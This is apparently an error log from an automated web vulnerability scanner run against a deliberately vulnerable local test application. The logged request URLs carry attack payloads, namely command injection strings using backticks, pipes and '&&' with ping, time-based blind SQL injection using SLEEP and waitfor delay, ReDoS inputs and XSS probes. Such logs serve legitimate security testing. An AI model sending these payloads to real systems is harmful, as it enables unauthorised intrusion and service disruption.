    <error caller="threading">b&#39;The os_commanding plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=%60ping%20-n%209%20localhost%60&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:13422)&#39;</error>
    <error caller="threading">b&#39;The os_commanding plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=%26%26ping%20-n%209%20localhost&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:13479)&#39;</error>
    <error caller="threading">b&#39;The blind_sqli plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=--%278%3A0%3A0%27%20yaled%20roftiaw%3B%271&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:13524)&#39;</error>
    <error caller="threading">b&#39;The os_commanding plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=%26%26%2Fusr%2Fsbin%2Fping%20-s%20localhost%209&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:13538)&#39;</error>
    <error caller="threading">b&#39;The os_commanding plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=tsohlacol%209%20n-%20gnip&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:13546)&#39;</error>
    <error caller="threading">b&#39;The os_commanding plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=tsohlacol%209%20c-%20gnip%0A&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:13567)&#39;</error>
    <error caller="threading">b&#39;The blind_sqli plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_6?comment=%27%2B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%284%29%29%29foo%29%2B%27&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:13597)&#39;</error>
    <error caller="threading">b&#39;The os_commanding plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=%60ping%20-c%209%20localhost%60&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:13604)&#39;</error>
    <error caller="threading">b&#39;The os_commanding plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=9%20tsohlacol%20s-%20gnip%2Fnibs%2Frsu%2F%7C&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:13620)&#39;</error>
    <error caller="threading">b&#39;The blind_sqli plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=1%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%288%29%29%29foo%29&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:13728)&#39;</error>
    <error caller="threading">b&#39;The os_commanding plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=9%20tsohlacol%20s-%20gnip%2Fnibs%2Frsu%2F%0A&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:13740)&#39;</error>
    <error caller="threading">b&#39;The os_commanding plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=tsohlacol%209%20n-%20gnip%3B&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:13803)&#39;</error>
    <error caller="threading">b&#39;The os_commanding plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=%7Cping%20-c%209%20localhost&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:13855)&#39;</error>
    <error caller="threading">b&#39;The os_commanding plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=%2Fusr%2Fsbin%2Fping%20-s%20localhost%209&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:13856)&#39;</error>
    <error caller="threading">b&#39;The os_commanding plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=%60ping%20-c%209%20localhost%60&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:13857)&#39;</error>
    <error caller="threading">b&#39;The blind_sqli plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=1%20OR%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%288%29%29%29foo%29&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:13951)&#39;</error>
    <error caller="threading">b&#39;The blind_sqli plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=%27%2B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%288%29%29%29foo%29%2B%27&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:13954)&#39;</error>
    <error caller="threading">b&#39;The blind_sqli plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=%22%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%288%29%29%29foo%29%20AND%20%221%22%3D%221&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:13991)&#39;</error>
    <error caller="threading">b&#39;The blind_sqli plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=%22%20OR%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%288%29%29%29foo%29%20OR%20%221%22%3D%222&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:14061)&#39;</error>
    <error caller="threading">b&#39;The os_commanding plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=tsohlacol%209%20n-%20gnip%0A%0D&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:14251)&#39;</error>
    <error caller="threading">b&#39;The os_commanding plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=9%20tsohlacol%20s-%20gnip%2Fnibs%2Frsu%2F%0A%0D&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:14270)&#39;</error>
    <error caller="threading">b&#39;The os_commanding plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=tsohlacol%209%20c-%20gnip%0A&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:14343)&#39;</error>
    <error caller="threading">b&#39;The os_commanding plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=%60tsohlacol%209%20n-%20gnip%60&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:14492)&#39;</error>
    <error caller="threading">b&#39;The blind_sqli plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=--%278%3A0%3A0%27%20yaled%20roftiaw%3B1&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:14516)&#39;</error>
    <error caller="threading">b&#39;The blind_sqli plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=--%278%3A0%3A0%27%20yaled%20roftiaw%3B%29%271&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:14611)&#39;</error>
    <error caller="threading">b&#39;The os_commanding plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=tsohlacol%209%20c-%20gnip%26%26&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:14678)&#39;</error>
    <error caller="threading">b&#39;The os_commanding plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=tsohlacol%209%20c-%20gnip%3B&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:14749)&#39;</error>
    <error caller="threading">b&#39;The os_commanding plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=tsohlacol%209%20n-%20gnip%7C&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:14977)&#39;</error>
    <error caller="threading">b&#39;The redos plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=a%40a.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX%21&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:15053)&#39;</error>
    <error caller="threading">b&#39;The redos plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=a%40a.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX%21&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:15424)&#39;</error>
    <error caller="threading">b&#39;The xss plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_1?comment=AWvQIRdUANpVKLywQHwweTFi%0A&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:17414)&#39;</error>
    <error caller="threading">b&#39;The xss plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_4?comment=AWvQIRdUANpVKLywQHwweTFi%0A&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:17415)&#39;</error>
    <error caller="threading">b&#39;The xss plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_2?comment=AWvQIRdUANpVKLywQHwweTFi%0A&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:17417)&#39;</error>
    <error caller="threading">b&#39;The xss plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_3?comment=AWvQIRdUANpVKLywQHwweTFi%0A&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:17418)&#39;</error>
    <error caller="threading">b&#39;The xss plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_5?comment=AWvQIRdUANpVKLywQHwweTFi%0A&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:17419)&#39;</error>
    <error caller="threading">b&#39;The xss plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=AWvQIRdUANpVKLywQHwweTFi%0A&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:17420)&#39;</error>
    <error caller="threading">b&#39;The xss plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_6?comment=AWvQIRdUANpVKLywQHwweTFi%0A&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:17421)&#39;</error>
</w4af-run>